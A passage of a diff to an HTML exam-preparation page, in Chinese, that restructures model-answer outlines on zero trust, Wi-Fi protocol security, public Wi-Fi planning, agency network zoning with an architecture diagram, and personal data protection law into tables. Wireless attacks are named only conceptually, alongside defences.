+        <div class="hl"><span class="t">✍️ 必寫拿分點</span>
+        1. 邊界防護的侷限要有<strong>「硬殼軟心」</strong>與<strong>「無法防橫向移動」</strong><br>
+        2. 零信任的定義句<strong>「永不信任，一律驗證」</strong>必寫<br>
+        3. 三原則<strong>「明確驗證、最小權限、假設已遭入侵」</strong>要完整<br>
+        4. 組成元件<strong>最好畫 PEP／PDP 圖</strong>，並含<strong>設備信任</strong>與<strong>微分段</strong><br>
+        5. 明確指出<strong>「零信任是架構理念與歷程，不是可採購的產品」</strong>——高分句<br>
+        6. 第三小題核心是<strong>「MFA 優先」</strong>與<strong>「ZTNA 只開放到特定應用而非整個網段」</strong><br>
+        7. <strong>分階段導入表</strong>最能展現實務可行性——機關人力預算有限，一次到位不切實際
+        </div>
       </div>
     </details>
   </div>
@@ -1335,47 +1601,70 @@
     </div>
     <details><summary>看答題架構</summary>
       <div class="ans">
-        <div class="frame"><span class="t">建議結構</span>
-        <strong>一、無線安全協定演進</strong><br>
-        　（一）表格比較（加密演算法／完整性機制／金鑰管理／安全性／現況）<br>
-        　　　‧ <strong>WEP</strong>：RC4 ＋ 24 位元 IV，IV 過短易重複 → <strong>數分鐘即可破解</strong>，絕不可使用<br>
-        　　　‧ <strong>WPA</strong>：TKIP（仍基於 RC4），為兼容舊硬體之<strong>過渡方案</strong>，現已不足<br>
-        　　　‧ <strong>WPA2</strong>：<strong>AES-CCMP</strong>，目前最低要求；曾有 KRACK 弱點（已由修補程式修正）<br>
-        　　　‧ <strong>WPA3</strong>：以 <strong>SAE</strong>（同時驗證等同）取代 PSK 交握 → 可<strong>防離線字典攻擊</strong>、提供<strong>前向保密</strong>；並有 Enhanced Open（開放網路加密）<br>
-        　（二）<strong>Personal vs Enterprise</strong>：<br>
-        　　　‧ Personal（PSK）：共享密碼，人員異動須全面更換<br>
-        　　　‧ <strong>Enterprise（802.1X ＋ RADIUS）</strong>：每人獨立帳號，<strong>離職僅需停用該帳號</strong>；機關內部網路應採此模式<br><br>
-        <strong>二、常見攻擊手法</strong><br>
-        　（一）<strong>竊聽（Eavesdropping）</strong>：無線訊號公開傳播，未加密即可被擷取<br>
-        　（二）<strong>惡意 AP（Rogue AP）</strong>：員工私接無線基地台，形成未受管控之後門<br>
-        　（三）<strong>邪惡雙胞胎（Evil Twin）</strong>：架設同名 SSID 誘使連線，進行中間人攻擊<br>
-        　（四）<strong>解除驗證攻擊（Deauth）</strong>：強制斷線，誘導重新連線以擷取交握封包或導向惡意 AP<br>
-        　（五）<strong>字典／暴力破解</strong>：擷取交握封包後離線破解 PSK（WPA3 的 SAE 可防範）<br>
-        　（六）<strong>WPS PIN 破解</strong>：應停用 WPS<br>
-        　（七）<strong>KRACK</strong>：針對 WPA2 金鑰重裝之弱點<br>
-        　（八）<strong>干擾（Jamming）</strong>：阻斷服務<br>
-        　（九）<u>並說明</u>下列<strong>不是</strong>有效防護：隱藏 SSID、MAC 位址過濾、降低發射功率——皆屬「以隱蔽代替安全」<br><br>
-        <strong>三、公共 Wi-Fi 安全規劃</strong><br>
-        　（一）<strong>網路隔離（最重要）</strong>：<br>
-        　　　1. 訪客網路<strong>完全獨立於機關內部網路</strong>，以獨立 VLAN 並經防火牆隔離<br>
-        　　　2. 啟用<strong>用戶端隔離（Client Isolation）</strong>，禁止訪客彼此連線<br>
-        　　　3. 僅開放上網所需之埠，禁止存取內部任何資源<br>
-        　（二）<strong>加密</strong>：<br>
-        　　　1. 至少採 WPA2/WPA3；若須開放式（免密碼）以便民，應採 <strong>WPA3 Enhanced Open（OWE）</strong>提供加密<br>
-        　　　2. 網頁登入頁面須使用 HTTPS<br>
-        　（三）<strong>身分識別與紀錄</strong>：<br>
-        　　　1. 依電信與相關法規保存<strong>連線紀錄</strong>（時間、識別碼、來源），以備調查<br>
-        　　　2. 可採簡訊認證或既有政府身分驗證機制（如 iTaiwan）<br>
-        　（四）<strong>使用管理</strong>：<br>
-        　　　1. 訂定<strong>使用者條款</strong>並要求同意，載明禁止事項與免責<br>
-        　　　2. 頻寬與時間限制，避免濫用<br>
-        　　　3. 內容過濾（阻擋惡意網站）<br>
-        　（五）<strong>個資考量</strong>：蒐集手機號碼等資料須符合《<strong>個人資料保護法</strong>》——告知<strong>特定目的</strong>、限於必要範圍、訂定保存期限並屆期銷毀<br>
-        　（六）<strong>維運</strong>：AP 韌體更新管理、定期偵測<strong>惡意 AP</strong>、集中管理與監控、納入機關資通安全維護計畫<br>
-        　（七）<strong>對民眾之提醒</strong>：於登入頁提示公共網路風險，建議避免於公共 Wi-Fi 進行金融交易<br><br>
-        <strong>四、結論</strong>：公共 Wi-Fi 應以「<strong>便民</strong>」與「<strong>隔離</strong>」並重為設計原則——提供服務的同時，必須確保其與機關內部網路完全區隔，並符合連線紀錄保存與個資保護之法規要求。
+        <div class="frame"><span class="t">📋 答題骨架</span>
+        一、四代協定演進（<u>主表</u>）→ 二、常見攻擊手法（表）→ 三、公共 Wi-Fi 規劃（表，分「架構／安全／法遵／維運」）
         </div>
-        <strong>💡 拿分關鍵</strong>：第三小題的<strong>「完全隔離」與「用戶端隔離」</strong>是核心。能提到「連線紀錄保存」與「個資法特定目的」是公部門考題的加分方向。
+
+        <strong>📊 一、WEP → WPA → WPA2 → WPA3</strong>
+        <div class="table-wrap"><table>
+          <tr><th>協定</th><th>年代</th><th>加密</th><th>完整性</th><th>主要問題／改進</th><th>現況</th></tr>
+          <tr><td><strong>WEP</strong></td><td>1999</td><td>RC4，40／104 位元金鑰</td><td>CRC-32</td><td><strong>IV 僅 24 位元且明文傳送、會重複</strong>；金鑰靜態；CRC 可被竄改 → <strong>數分鐘即可破解</strong></td><td><strong>絕對禁用</strong></td></tr>
+          <tr><td><strong>WPA</strong></td><td>2003</td><td>RC4 + <strong>TKIP</strong></td><td>MIC（Michael）</td><td>過渡方案，可沿用舊硬體；<strong>每封包更換金鑰</strong>；<u>但底層仍是 RC4，已被破解</u></td><td><strong>不建議使用</strong></td></tr>
+          <tr><td><strong>WPA2</strong></td><td>2004</td><td><strong>AES-CCMP</strong></td><td>CCMP</td><td>安全性大幅提升；<u>但 2017 年發現 <strong>KRACK</strong> 攻擊（四向交握重放）</u>；<strong>PSK 模式易遭離線字典攻擊</strong></td><td>可用（<strong>須更新韌體</strong>）</td></tr>
+          <tr><td><strong>WPA3</strong></td><td>2018</td><td>AES-GCMP-256（企業版）</td><td>GCMP</td><td>‧ <strong>SAE</strong> 取代 PSK 交握 → <strong>抵抗離線字典攻擊</strong>、具<strong>前向保密</strong><br>‧ <strong>強制管理框架保護（PMF）</strong>→ 防解除認證攻擊<br>‧ <strong>OWE</strong>：開放網路也能<strong>加密</strong><br>‧ Easy Connect 簡化 IoT 設定</td><td><strong>建議採用</strong></td></tr>
+        </table></div>
+        <div class="frame">
+          <span class="t">📐 三個必記的 WPA3 關鍵字</span>
+          <strong>SAE</strong>（Simultaneous Authentication of Equals）——即使密碼很弱，攻擊者也<u>無法離線暴力破解</u>，每次猜測都必須與 AP 互動。<br>
+          <strong>PMF</strong>（Protected Management Frames）——管理框架也受保護，<u>解除認證攻擊失效</u>。<br>
+          <strong>OWE</strong>（Opportunistic Wireless Encryption）——<strong>開放式網路（不需密碼）也能加密</strong>，解決了公共 Wi-Fi 全明文的老問題。
+        </div>
+        <p style="font-size:.88rem"><strong>另須區分</strong>：<strong>Personal 模式</strong>（PSK／SAE，共用密碼）vs <strong>Enterprise 模式</strong>（802.1X + RADIUS，<strong>每人獨立帳號</strong>，可個別撤銷）。<u>機關內部網路應採 Enterprise 模式。</u></p>
+
+        <strong>📊 二、常見攻擊手法</strong>
+        <div class="table-wrap"><table>
+          <tr><th>攻擊</th><th>手法</th><th>危害</th></tr>
+          <tr><td><strong>惡意熱點</strong>（Evil Twin／Rogue AP）</td><td>架設與機關<strong>同名 SSID</strong> 且訊號更強的假 AP</td><td>誘使連線後<strong>竊取帳密與資料</strong>，為公共場所最大威脅</td></tr>
+          <tr><td><strong>解除認證攻擊</strong>（Deauth）</td><td>偽造管理框架強制斷線</td><td>造成<strong>阻斷服務</strong>；或迫使重連以<strong>捕捉交握封包</strong>供離線破解</td></tr>
+          <tr><td><strong>離線字典／暴力破解</strong></td><td>捕捉四向交握後離線猜測 PSK</td><td>弱密碼可在數小時內破出（<u>WPA3-SAE 可防</u>）</td></tr>
+          <tr><td><strong>中間人攻擊</strong>（MITM）</td><td>結合惡意熱點或 ARP 欺騙</td><td>攔截與竄改流量</td></tr>
+          <tr><td><strong>KRACK</strong></td><td>重放四向交握訊息，使金鑰重置</td><td>可解密部分流量（<u>更新韌體即可修補</u>）</td></tr>
+          <tr><td><strong>WPS PIN 攻擊</strong></td><td>WPS 的 8 位數 PIN 設計缺陷</td><td>數小時內取得密碼 → <strong>應停用 WPS</strong></td></tr>
+          <tr><td>戰爭駕駛（War Driving）</td><td>開車掃描標記無線網路</td><td>建立攻擊目標清單</td></tr>
+          <tr><td>干擾（Jamming）</td><td>發射同頻干擾訊號</td><td>阻斷服務</td></tr>
+        </table></div>
+        <div class="warn"><span class="t">⚠️ 兩個無效的「安全措施」</span>
+        <strong>① 隱藏 SSID</strong>——探測封包中仍會出現，用工具數秒即可發現。<br>
+        <strong>② MAC 位址過濾</strong>——MAC 明文傳送且可輕易偽造。<br><br>
+        兩者<strong>只能防止一般人誤連，不具實質安全效果</strong>，不可作為主要防護。<u>寫出這一點是明顯的加分。</u></div>
+
+        <strong>📊 三、公共 Wi-Fi 安全規劃建議</strong>
+        <div class="table-wrap"><table>
+          <tr><th>面向</th><th>建議</th></tr>
+          <tr><td rowspan="3"><strong>網路架構</strong></td><td><strong>與內部網路完全隔離</strong>——獨立 VLAN、獨立對外線路或經防火牆嚴格隔離；<u>絕不可與辦公網段互通</u></td></tr>
+          <tr><td><strong>啟用用戶端隔離</strong>（Client Isolation）——禁止訪客之間互相連線，避免民眾裝置互相攻擊</td></tr>
+          <tr><td>限制可用埠與協定，<strong>僅允許一般上網</strong>；限制頻寬避免濫用</td></tr>
+          <tr><td rowspan="4"><strong>安全防護</strong></td><td>採 <strong>WPA3</strong>；若須開放不設密碼，應啟用 <strong>OWE</strong> 使流量仍加密</td></tr>
+          <tr><td>停用 <strong>WPS</strong>；AP 韌體<strong>定期更新</strong>；變更管理介面預設密碼</td></tr>
+          <tr><td>部署<strong>無線入侵偵測（WIDS）</strong>，偵測<strong>惡意熱點</strong>與異常訊號</td></tr>
+          <tr><td>AP 實體固定與防拆；管理介面不對外開放</td></tr>
+          <tr><td rowspan="3"><strong>法遵與個資</strong></td><td><strong>使用者認證</strong>（手機簡訊或 eID）——蒐集手機號碼須符合《個人資料保護法》<strong>特定目的</strong>並<strong>告知</strong>；不得逾必要範圍</td></tr>
+          <tr><td>依規定<strong>保存連線紀錄</strong>（供必要時查證），並訂定<strong>保存年限</strong>與屆期銷毀</td></tr>
+          <tr><td>張貼<strong>使用條款與安全提醒</strong>（提醒民眾勿於公共網路操作金融交易）</td></tr>
+          <tr><td rowspan="3"><strong>維運管理</strong></td><td>納入機關<strong>資通安全維護計畫</strong>；明定管理權責</td></tr>
+          <tr><td>定期<strong>檢視日誌</strong>與異常流量；建立事件通報流程</td></tr>
+          <tr><td>訂定<strong>服務時段</strong>（如僅辦公時間開放），降低非上班時間的風險</td></tr>
+        </table></div>
+
+        <div class="hl"><span class="t">✍️ 必寫拿分點</span>
+        1. 演進表<strong>務必含加密演算法欄</strong>（RC4 → RC4+TKIP → AES-CCMP → AES-GCMP）<br>
+        2. <strong>WEP 的致命傷是「IV 只有 24 位元且明文」</strong>——具體寫出原因，不能只說「不安全」<br>
+        3. <strong>WPA3 三大關鍵字 SAE、PMF、OWE 必寫</strong>，且要說明各解決什麼問題<br>
+        4. 區分 <strong>Personal（PSK）vs Enterprise（802.1X）</strong>，並建議機關內網用 Enterprise<br>
+        5. 攻擊手法<strong>至少六種</strong>；<strong>惡意熱點</strong>與<strong>解除認證</strong>是核心<br>
+        6. <strong>指出「隱藏 SSID」與「MAC 過濾」無效</strong>——高鑑別度加分句<br>
+        7. 公共 Wi-Fi 三個必寫：<strong>完全隔離</strong>、<strong>用戶端隔離</strong>、<strong>連線紀錄保存＋個資法告知</strong>
+        </div>
       </div>
     </details>
   </div>
@@ -1388,49 +1677,112 @@
     </div>
     <details><summary>看答題架構</summary>
       <div class="ans">
-        <div class="frame"><span class="t">建議結構</span>
-        <strong>一、設計原則（先講原則再講細節，結構才清楚）</strong><br>
-        　（一）<strong>網段隔離</strong>：依業務性質與敏感度分區，限制橫向移動<br>
-        　（二）<strong>縱深防禦</strong>：周邊、網段、主機、應用、資料多層設防<br>
-        　（三）<strong>最小權限</strong>：跨區存取採預設拒絕、逐條開放<br>
-        　（四）<strong>無單點故障</strong>：關鍵路徑與設備備援<br>
-        　（五）<strong>可管理性</strong>：集中監控與日誌，並考量機關維運人力<br><br>
-        <strong>二、網路分區設計</strong>（<u>務必畫架構圖</u>）<br>
-        <div class="table-wrap"><table>
-          <tr><th>區域</th><th>內容</th><th>安全考量</th></tr>
-          <tr><td><strong>對外連線區</strong></td><td>雙 ISP 線路、邊界路由器</td><td>雙線備援、DDoS 防護（可採 ISP 清洗服務）</td></tr>
-          <tr><td><strong>DMZ</strong></td><td>官網、郵件閘道、反向代理</td><td>與內網以防火牆隔離；<strong>資料庫不得置於此</strong>；部署 WAF</td></tr>
-          <tr><td><strong>伺服器區</strong></td><td>AP 伺服器、資料庫、AD、檔案伺服器</td><td>獨立 VLAN；僅開放必要埠；管理埠限管理網段</td></tr>
-          <tr><td><strong>辦公網段</strong></td><td>300 台電腦（可依樓層或單位再細分 VLAN）</td><td>端點防護（EDR）、修補管理、非管理員權限</td></tr>
-          <tr><td><strong>IoT／實體安全網段</strong></td><td>IP 監視、門禁</td><td><strong>完全獨立</strong>；此類設備常有預設密碼與韌體漏洞，須變更預設憑證、限制對外連線</td></tr>
-          <tr><td><strong>訪客 Wi-Fi 網段</strong></td><td>公共 Wi-Fi</td><td>完全隔離、用戶端隔離、連線紀錄保存</td></tr>
-          <tr><td><strong>管理網段</strong></td><td>設備管理介面、監控系統</td><td><strong>頻外管理（Out-of-band）</strong>，不與業務流量混用</td></tr>
-          <tr><td><strong>遠端存取</strong></td><td>VPN／ZTNA 閘道</td><td><strong>強制 MFA</strong>、限制可存取範圍、完整日誌</td></tr>
-        </table></div>
-        　IP 位址規劃：可取一段私有位址（如 10.1.0.0/16）依區域分配，並預留擴充；辦公網段 300 台需 /23（510 個可用）或分為兩個 /24<br><br>
-        <strong>三、資安防護措施（分層說明）</strong><br>
-        　（一）<strong>周邊</strong>：NGFW（預設拒絕、雙向管控）、IPS、DDoS 防護、郵件安全閘道（沙箱、SPF/DKIM/DMARC）<br>
-        　（二）<strong>網段</strong>：VLAN 隔離 ＋ ACL；DHCP Snooping ＋ <strong>DAI</strong> 防 ARP 欺騙；Port Security；有線埠可考慮 802.1X<br>
-        　（三）<strong>主機</strong>：作業系統安全基準組態（Hardening）、修補管理、<strong>EDR</strong>、防毒、關閉不必要服務<br>
-        　（四）<strong>應用</strong>：WAF、安全開發規範、上線前源碼檢測與滲透測試<br>
-        　（五）<strong>資料</strong>：敏感資料加密（傳輸 TLS、靜態加密）、權限最小化、<strong>資料外洩防護（DLP）</strong><br>
-        　（六）<strong>監控</strong>：<strong>SIEM</strong> 集中收集日誌並關聯分析、設備時間同步（NTP，確保日誌時序可比對）、告警通報流程<br>
-        　（七）<strong>管理</strong>：資安政策、教育訓練、社交工程演練、定期弱點掃描、權限盤點<br><br>
-        <strong>四、備援與可用性考量</strong><br>
-        　（一）<strong>網路層</strong>：雙 ISP、核心交換器堆疊或雙機、<strong>鏈路聚合（LACP）</strong>、<strong>STP／RSTP</strong> 防迴圈並提供備援路徑<br>
-        　（二）<strong>設備層</strong>：關鍵設備雙電源、UPS 與發電機、機房溫濕度與消防監控<br>
-        　（三）<strong>伺服器層</strong>：虛擬化叢集（HA）、負載平衡、RAID<br>
-        　（四）<strong>資料層</strong>：備份採 <strong>3-2-1 原則</strong>（3 份、2 種媒體、<strong>1 份異地</strong>），且須有<strong>離線／不可變備份</strong>以防勒索軟體；訂定 <strong>RTO／RPO</strong> 並<strong>定期演練還原</strong><br>
-        　（五）<strong>制度層</strong>：訂定 <strong>BCP／DRP</strong>，明定應變組織與程序，並定期演練<br><br>
-        <strong>五、導入與管理考量（加分段）</strong><br>
-        　（一）依《<strong>政府採購法</strong>》辦理，需求規格書應明定資安要求與驗收標準<br>
-        　（二）依《<strong>資通安全管理法</strong>》納入資通安全維護計畫，並依機關<strong>資安責任等級</strong>辦理應辦事項<br>
-        　（三）評估機關<strong>維運人力</strong>，設備選型不宜過度複雜；可考慮委外監控（MSSP）補足 24 小時監控能量<br>
-        　（四）分階段建置：先完成核心網路與隔離架構，再逐步導入進階防護<br>
-        　（五）預留 <strong>IPv6</strong> 支援能力，並確認資安設備具備 IPv6 檢測能力（避免形成防護盲點）<br><br>
-        <strong>六、結論</strong>：本架構以<strong>分區隔離</strong>為骨幹、<strong>縱深防禦</strong>為策略、<strong>備援設計</strong>確保可用性；並須以管理制度與人員訓練配合，方能真正發揮防護效果。
+        <div class="frame"><span class="t">📋 答題骨架</span>
+        一、需求分析與設計原則 → 二、<u>架構圖</u> → 三、分區設計（<u>主表</u>）→ 四、資安防護（分層）→ 五、備援考量 → 六、管理與法遵
         </div>
-        <strong>💡 拿分關鍵</strong>：這是大型情境規劃題，<strong>分區表格 + 架構圖</strong>是骨架。特別要記得把「IoT／監視系統獨立網段」與「管理網段頻外管理」寫進去——這兩項最常被忽略，寫了就顯得專業。最後的「維運人力考量」是公部門的現實，很加分。
+
+        <strong>📊 一、設計原則</strong>
+        <div class="table-wrap"><table>
+          <tr><th>原則</th><th>說明</th></tr>
+          <tr><td><strong>分區隔離</strong></td><td>依<strong>信任等級</strong>與<strong>業務性質</strong>切分 VLAN，限制橫向移動</td></tr>
+          <tr><td><strong>縱深防禦</strong></td><td>邊界、網路、端點、應用、資料多層防護，不倚賴單一設備</td></tr>
+          <tr><td><strong>最小權限與預設拒絕</strong></td><td>先全部封鎖，再逐條開放必要通訊，並<strong>雙向管控</strong></td></tr>
+          <tr><td><strong>無單點失效</strong></td><td>關鍵設備與線路皆須備援</td></tr>
+          <tr><td>可管理性</td><td>集中監控與日誌；架構清楚，利於人員交接（<u>機關人事輪調頻繁</u>）</td></tr>
+        </table></div>
+
+        <strong>📊 二、架構圖</strong>
+        <pre>                        網際網路
+                            │
+              ┌─────────────┴─────────────┐
+              │  雙 ISP（不同業者）＋ 邊界路由器 │  ← 線路備援
+              └─────────────┬─────────────┘
+                            │
+                   ┌────────┴────────┐
+                   │  外部防火牆（HA 雙機） │
+                   └────────┬────────┘
+                            │
+          ┌─────────────────┼─────────────────┐
+          │                 │                 │
+      ┌───┴────┐      ┌─────┴─────┐    ┌──────┴──────┐
+      │  DMZ   │      │  VPN/ZTNA │    │  公共 Wi-Fi  │
+      │ 對外網站│      │  遠端存取  │    │（完全隔離）  │
+      │ 對外郵件│      │  50 人    │    │  獨立線路    │
+      └────────┘      └─────┬─────┘    └─────────────┘
+                            │
+                   ┌────────┴────────┐
+                   │  內部防火牆      │  ← 兩層防火牆（雙層縱深）
+                   └────────┬────────┘
+                            │
+              ┌──────┬──────┼──────┬──────┐
+              │      │      │      │      │
+          ┌───┴──┐┌──┴───┐┌─┴──┐┌──┴───┐┌─┴────┐
+          │伺服器││辦公   ││IP  ││門禁  ││管理   │
+          │  區  ││300台  ││監視││系統  ││網段   │
+          │      ││(多VLAN)││    ││      ││(OOB) │
+          └──────┘└───────┘└────┘└──────┘└──────┘
+           核心交換器（堆疊／HA）＋ 各樓層接取交換器</pre>
+
+        <strong>📊 三、分區設計</strong>
+        <div class="table-wrap"><table>
+          <tr><th>區域</th><th>內容</th><th>位址規劃</th><th>存取政策</th></tr>
+          <tr><td><strong>DMZ</strong></td><td>對外網站、對外郵件、反向代理</td><td>獨立網段</td><td>對外開放 80／443／25；<strong>DMZ 主機不得主動連入內網</strong>；資料庫置於內網，僅開放應用埠</td></tr>
+          <tr><td><strong>伺服器區</strong></td><td>內部應用、資料庫、檔案、AD</td><td>獨立 VLAN</td><td>僅開放必要服務埠；<strong>管理埠僅限跳板機</strong>；伺服器間亦應微分段</td></tr>
+          <tr><td><strong>辦公網段</strong></td><td>300 台電腦</td><td>建議<strong>切為數個 VLAN</strong>（依樓層或單位）</td><td>可存取伺服器應用埠；<u>不得直接連資料庫</u>；上網經內容過濾。<strong>300 台放同一廣播網域會有廣播風暴風險</strong></td></tr>
+          <tr><td><strong>IP 監視系統</strong></td><td>攝影機、錄影主機</td><td><strong>完全獨立 VLAN</strong></td><td>IoT 設備常有<strong>預設密碼與韌體漏洞</strong> → <strong>禁止主動連外</strong>，僅允許連至錄影主機；<strong>強制變更預設憑證</strong></td></tr>
+          <tr><td><strong>門禁系統</strong></td><td>讀卡機、控制器</td><td>獨立 VLAN</td><td>同上；<u>屬實體安全系統，中斷影響大</u>，須確保可用性與離線運作能力</td></tr>
+          <tr><td><strong>公共 Wi-Fi</strong></td><td>洽公民眾</td><td><strong>獨立線路或完全隔離</strong></td><td><strong>與內網零連通</strong>；<strong>用戶端隔離</strong>；僅允許上網；<strong>保存連線紀錄</strong>；認證涉個資須告知</td></tr>
+          <tr><td><strong>遠端存取</strong></td><td>50 人遠距辦公</td><td>—</td><td><strong>全面 MFA</strong>；採 <strong>ZTNA</strong> 僅開放到特定應用；<strong>設備健康檢查</strong>；全程記錄</td></tr>
+          <tr><td><strong>管理網段（OOB）</strong></td><td>設備管理介面</td><td><strong>頻外管理</strong>網段</td><td><u>與業務流量分離</u>；僅限資訊人員；<strong>網路故障時仍可管理設備</strong></td></tr>
+        </table></div>
+        <div class="frame">
+          <span class="t">📐 位址規劃建議（以 10.10.0.0/16 為例）</span>
+          辦公 A 棟 <strong>10.10.10.0/23</strong>（510 台）｜伺服器 <strong>10.10.20.0/24</strong>｜DMZ <strong>10.10.30.0/26</strong><br>
+          IP 監視 <strong>10.10.40.0/24</strong>｜門禁 <strong>10.10.41.0/26</strong>｜公共 Wi-Fi <strong>10.10.50.0/22</strong>｜管理 <strong>10.10.99.0/24</strong><br><br>
+          <strong>原則：預留成長空間、網段用途以第三段區分（好記好管理）、監視與門禁等 IoT 給足位址。</strong>
+        </div>
+
+        <strong>📊 四、資安防護（分層）</strong>
+        <div class="table-wrap"><table>
+          <tr><th>層次</th><th>措施</th></tr>
+          <tr><td><strong>邊界</strong></td><td>次世代防火牆（含 IPS、應用辨識）、<strong>WAF</strong> 保護對外網站、郵件安全閘道（沙箱、SPF/DKIM/DMARC）、DDoS 防護</td></tr>
+          <tr><td><strong>網路</strong></td><td>VLAN 分區＋ACL；<strong>預設拒絕、雙向管控</strong>；<strong>802.1X（NAC）</strong>；交換器啟用 Port Security、DHCP Snooping、動態 ARP 檢查</td></tr>
+          <tr><td><strong>端點</strong></td><td><strong>EDR</strong>、修補管理、磁碟加密、<strong>使用者非管理員權限</strong>、停用巨集、USB 管控</td></tr>
+          <tr><td><strong>身分</strong></td><td>集中式身分管理、<strong>MFA</strong>、<strong>特權帳號管理與跳板機</strong>、定期權限複核、<strong>離職即停用帳號</strong></td></tr>
+          <tr><td><strong>應用與資料</strong></td><td>安全開發、定期弱點掃描與滲透測試、資料分類分級、加密、<strong>DLP</strong></td></tr>
+          <tr><td><strong>監控</strong></td><td><strong>日誌集中（SIEM）</strong>、異常告警、<strong>NTP 時間同步</strong>（<u>否則日誌無法勾稽</u>）、定期檢視</td></tr>
+        </table></div>
+
+        <strong>📊 五、備援考量</strong>
+        <div class="table-wrap"><table>
+          <tr><th>層面</th><th>備援設計</th></tr>
+          <tr><td><strong>對外線路</strong></td><td><strong>雙 ISP 且為不同業者、不同進線路徑</strong>（<u>同一業者的兩條線常走同一管道，一併中斷</u>）</td></tr>
+          <tr><td><strong>網路設備</strong></td><td>核心交換器<strong>堆疊或雙機 HA</strong>；防火牆<strong>雙機備援</strong>；接取交換器上聯<strong>雙鏈路</strong>（STP／鏈路聚合）</td></tr>
+          <tr><td><strong>電力</strong></td><td>機房 <strong>UPS ＋ 發電機</strong>；重要設備<strong>雙電源</strong>接不同迴路；定期測試</td></tr>
+          <tr><td><strong>伺服器</strong></td><td>虛擬化叢集、RAID、<strong>異地備份</strong>（3-2-1 原則＋<strong>離線副本</strong>防勒索）</td></tr>
+          <tr><td><strong>服務</strong></td><td>重要系統雙機或負載平衡；<strong>訂定 RTO／RPO</strong> 並據以設計</td></tr>
+          <tr><td><strong>營運持續</strong></td><td>訂定 <strong>BCP／DRP</strong>；<strong>定期演練並計時</strong>；準備<strong>手動替代作業程序</strong>（系統全斷時仍能對民眾提供基本服務）</td></tr>
+        </table></div>
+
+        <strong>📊 六、管理與法遵</strong>
+        <div class="table-wrap"><table>
+          <tr><th>項目</th><th>內容</th></tr>
+          <tr><td>文件</td><td><strong>網路架構圖、IP 配置表、設備清冊、線路標示</strong>——並<strong>隨異動更新</strong>（<u>機關最常見的缺失</u>）</td></tr>
+          <tr><td>變更管理</td><td>設定變更須<strong>紀錄、核准並備妥回復方案</strong>；定期備份設備組態</td></tr>
+          <tr><td>法遵</td><td>依《<strong>資通安全管理法</strong>》納入資通安全維護計畫、辦理演練與稽核；監視與 Wi-Fi 涉個資者依《<strong>個人資料保護法</strong>》辦理</td></tr>
+          <tr><td>委外</td><td>建置與維運契約明定<strong>資安責任、SLA、原始碼與組態交付、退場條款</strong></td></tr>
+          <tr><td>人員</td><td>資訊人力有限 → 宜<strong>簡化架構、標準化設定</strong>，並評估<strong>委外監控</strong>補足能量</td></tr>
+        </table></div>
+
+        <div class="hl"><span class="t">✍️ 必寫拿分點</span>
+        1. <strong>一定要畫架構圖</strong>——這是本題最大的配分，純文字很難拿高分<br>
+        2. 分區表<strong>要涵蓋題目給的每一項需求</strong>，一項都不能漏（漏一項扣一項）<br>
+        3. <strong>IP 監視與門禁屬 IoT，必須獨立隔離且禁止主動連外</strong>——最容易被忽略<br>
+        4. <strong>300 台辦公電腦應切為多個 VLAN</strong>（廣播風暴考量）——顯示有真的思考<br>
+        5. 補上<strong>管理網段（OOB）</strong>——極少人寫，非常加分<br>
+        6. 備援要指出<strong>「雙 ISP 須不同業者且不同進線路徑」</strong>、<strong>「UPS＋發電機」</strong><br>
+        7. 加分句：<strong>NTP 時間同步否則日誌無法勾稽</strong>、<strong>手動替代作業程序</strong>、<strong>架構圖須隨異動更新</strong>
+        </div>
       </div>
     </details>
   </div>
@@ -1444,45 +1796,71 @@
     </div>
     <details><summary>看答題架構</summary>
       <div class="ans">
-        <div class="frame"><span class="t">建議結構</span>
-        <strong>一、個資法主要規範</strong><br>
-        　（一）<strong>個人資料之定義</strong>：得以<strong>直接或間接</strong>方式識別特定個人之資料（姓名、身分證字號、聯絡方式、特徵、社會活動等）<br>
-        　（二）<strong>特種個資</strong>：病歷、醫療、基因、性生活、健康檢查、犯罪前科 → 原則不得蒐集處理利用，除法定例外情形<br>
-        　（三）<strong>三種行為之合法要件</strong>：<br>
-        　　　‧ 蒐集／處理：須有<strong>特定目的</strong>且符合法定事由（如執行法定職務必要範圍內、當事人同意）<br>
-        　　　‧ 利用：原則應於<strong>蒐集之特定目的必要範圍內</strong>；<strong>目的外利用</strong>須符合法定例外<br>
-        　（四）<strong>告知義務</strong>：蒐集時應告知蒐集機關、目的、類別、利用期間地區對象方式、當事人權利<br>
-        　（五）<strong>當事人權利</strong>：查詢閱覽、製給複製本、補充更正、請求停止蒐集處理利用、請求刪除<br>
-        　（六）<strong>安全維護義務</strong>：應採行<strong>適當之技術與組織措施</strong>，防止個資遭竊取、竄改、毀損、滅失或洩漏<br>
-        　（七）<strong>外洩通知</strong>：發生違反情事時應查明後<strong>通知當事人</strong><br>
-        　（八）責任：民事損害賠償、行政罰、刑事責任<br><br>
-        <strong>二、技術措施</strong>（表格：技術／說明／可否還原／適用情境）<br>
-        　（一）<strong>加密</strong>：傳輸加密（TLS）、靜態加密（TDE／磁碟加密）；<u>金鑰管理</u>為關鍵（宜用 HSM）<br>
-        　（二）<strong>雜湊加鹽</strong>：密碼儲存須用 <strong>bcrypt／Argon2 ＋ 隨機鹽</strong>，不可用 MD5 或可還原之加密<br>
-        　（三）<strong>遮罩（Masking）</strong>：畫面與報表顯示部分遮蔽（A12345****）<br>
-        　（四）<strong>代碼化（Tokenization）</strong>：以無意義代碼取代，對照表另行嚴格保管<br>
-        　（五）<strong>去識別化／假名化／k-匿名／差分隱私</strong>：依用途選擇強度<br>
-        　（六）<strong>存取控制</strong>：<strong>RBAC</strong>、最小權限、以<strong>檢視表</strong>限制可見欄位與列、定期權限盤點<br>
-        　（七）<strong>稽核軌跡</strong>：記錄「誰、何時、查了誰的資料」，並定期分析<strong>異常查詢</strong>（如大量查詢、查詢與業務無關對象）<br>
-        　（八）<strong>資料外洩防護（DLP）</strong>：管控資料外傳（郵件、USB、雲端）<br>
-        　（九）<strong>環境隔離</strong>：<strong>測試環境不得使用真實個資</strong>，應以去識別化或合成資料取代 ← 常被忽略但很重要<br>
-        　（十）<strong>資料保存與銷毀</strong>：訂定保存期限，屆期依規定安全銷毀（含備份媒體）<br><br>
-        <strong>三、資料開放應注意事項</strong><br>
-        　（一）<strong>去識別化為前提</strong>：移除直接識別欄位（姓名、身分證字號、完整地址、電話）<br>
-        　（二）<strong>注意間接識別與重新識別風險</strong>：<br>
-        　　　1. 準識別欄位組合（<strong>出生年月日＋性別＋郵遞區號</strong>）即可能識別特定個人<br>
-        　　　2. <strong>與其他公開資料集交叉比對</strong>可能重新識別 → 應進行重新識別風險評估<br>
